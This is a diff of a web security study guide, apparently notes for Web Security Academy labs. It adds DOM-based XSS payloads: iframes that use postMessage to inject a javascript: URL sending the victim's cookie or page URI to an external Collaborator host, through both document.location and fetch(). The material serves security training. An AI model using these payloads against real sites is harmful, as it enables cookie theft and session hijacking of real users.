@@ -296,12 +296,12 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is send to the Burp collaboration server.  
 
 ```html
-<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+<iframe src=https://0a9b0095033ea0248419fa5500da0025.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
     "type": "load-channel",
-    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
+    "url": "JavaScript:document.location=`https://0z03mgnzhgnpt3ii6c84f5o49vfm3lra.oastify.com?cook=`+document.baseURI"
 }), "*");'>
-
 ```
+- Using fetch()
 ```html
 <iframe src=https://0a9b0095033ea0248419fa5500da0025.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch(`https://0tu3gghzbghpn3ci0c2495i43v9mxkl9.oastify.com/?data=`+document.cookie)\"}","*")'>
 ```
